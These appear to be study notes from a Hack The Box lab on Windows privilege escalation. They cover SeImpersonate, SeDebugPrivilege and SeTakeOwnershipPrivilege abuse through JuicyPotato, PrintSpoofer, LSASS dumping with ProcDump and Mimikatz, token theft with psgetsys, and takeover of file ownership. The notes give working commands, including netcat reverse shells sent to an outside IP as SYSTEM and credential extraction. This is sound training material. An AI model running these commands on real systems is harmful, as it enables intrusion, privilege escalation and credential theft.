
---
### SeImpersonate
#### JuicyPotato
We have achieved command execution as this user using `xp_cmdshell` using a set of credentials obtained in a `logins.sql` file on a file share using the `Snaffler` tool.
```bash
hcx05@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
#-windows-auth: When the ID is a Windows user.
```

```sql
SQL> enable_xp_cmdshell 

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. 
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```
Confirming Access
```sql
SQL> xp_cmdshell whoami 

output 

--------------------------------------------------------------------

nt service\mssql$sqlexpress01
```
Checking Account Privileges
```sql
SQL> xp_cmdshell whoami /priv 

SeImpersonatePrivilege Impersonate a client after authentication Enable
```
[JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` 
privileges via DCOM/NTLM reflection abuse.
```sql
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t * 
-- -p: Create a process using this identity.
-- -a "...": Argument that will pass to the process we've just created.
-- /c: Tell cmd to stop while the argument is done.
-- -t: CreateProcessWithTokenW, needs SeImpersonate
-- -t *: Try all ways to get promoted.

output 

--------------------------------------------------------------------

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375 
[+] authresult 0 
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM 
[+] CreateProcessWithTokenW OK 
[+] calling 0x000000000088ce08
```
Catching SYSTEM Shell
```bash
hcx05@htb[/htb]$ sudo nc -lnvp 8443
```
#### PrintSpoofer and RoguePotato
uicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access.

[PrintSpoofer blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
#### Escalating Privileges using PrintSpoofer
```sql
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

### SeDebugPrivilege
By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures.
#### ProcDump
Use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to dump sensitive information.
```cmd
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp
#-ma :Full dump
```
#### Mimikatz
Load `lsass.dmp` in `Mimikatz` using the `sekurlsa::minidump`
command.
```cmd
C:\htb> mimikatz.exe C:\Windows\Temp\debug.txt

mimikatz # log 
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp 
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords 
Opening : 'lsass.dmp' file for minidump...
```
Suppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the `LSASS` process via the Task Manager by browsing to the `Details` tab, choosing the `LSASS` process, and selecting `Create dump file`.
### Remote Code execution as SYSTEM
We can elevate our privileges to SYSTEM by launching a child processand using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a parent process and impersonate it.
```powershell
PS C:\htb> tasklist 
Image Name              PID Session Name        Session#   Mem Usage 
================== ======== ================ =========== =========== 
System Idle Process       0 Services                   0         4 K 
System                    4 Services                   0       116 K 
smss.exe                340 Services                   0     1,212 K 
csrss.exe               444 Services                   0     4,696 K 
wininit.exe             548 Services                   0     5,240 K 
csrss.exe               556 Console                    1     5,972 K 
winlogon.exe            612 Console                    1    10,408 K
```
First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system.
```powershell
Import-Module .\psgetsys.ps1
```
Next we just load the script and run it
```powershell
[MyProcess]::CreateProcessFromParent(<system_pid>,"C:\Windows\System32\cmd.exe","")
```
If we don't have RDP
```powershell
.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id,"c:\windows\system32\cmd.exe","")
```
Another tool such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
exist to pop a SYSTEM shell when we have `SeDebugPrivilege`.
### SeTakeOwnershipPrivilege
This privilege comes from `gpedit.msc`, `Computer Config` > `WIndows Setting` > `Security Settigs` > `Local Policies` > `User Rights Assignment` > `Take ownership of diles or other objects`.
```powershell
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION 
----------------------
Privilege Name                State
============================= ========
SeTakeOwnershipPrivilege      Disabled
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Disabled
```
#### Enabling SeTakeOwnershipPrivilege
Use [EnableAllTokenPrivs.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) script, detail in [this](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) blog post, or [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one.
```powershell
PS C:\htb> Import-Module .\Enable-Privilege.ps1 
PS C:\htb> .\EnableAllTokenPrivs.ps1 
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION 
----------------------
Privilege Name                State
============================= ========
SeTakeOwnershipPrivilege      Enabled
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Enabled
```
#### Choosing a Target File
It is common to encounter file shares with `Public` and 
`Private` directories with subdirectories set up by department.

Note: Take great care when performing a potentially destructive action like ***changing file ownership***, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.
#### Checking File Ownership
```powershell
PS C:\htb> Get-ChildItem -Path '[Target file path]' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```
If our current privilege is not enough (do not have `READ_CONTROL` privilege), we can't even see the Security Descriptor, in this case, we can't see who is the owner of the target file, so we have to change our tactic, we can observe the parent directory presission and check its owner.
```powershell
PS C:\htb> cmd /c dir /q '[Parent dir path]'
#cmd /c: call CMD to execute the commamd in the powershell environment and exit.
#/q: display the Ownership infromation.
```
#### Taking Ownership
Use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.
```powershell
PS C:\htb> takeown /f '[target file path]'
```
#### Confirming Ownership Changed
```powershell
Get-ChildItem -Path '[Target_File_Path]' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```
#### Modify ACL
DACL: Discretionary Access Control List
SACL: System Access Control List

Here we modify DACL
```powershell
PS C:\htb> icacls '[Target_File]' /grant [Your_User]:F
```
#### Files of Interest
```shell
c:\inetpub\wwwwroot\web.config %WINDIR%\repair\sam %WINDIR%\repair\system %WINDIR%\repair\software, %WINDIR%\repair\security %WINDIR%\system32\config\SecEvent.Evt %WINDIR%\system32\config\default.sav %WINDIR%\system32\config\security.sav %WINDIR%\system32\config\software.sav %WINDIR%\system32\config\system.sav
```

















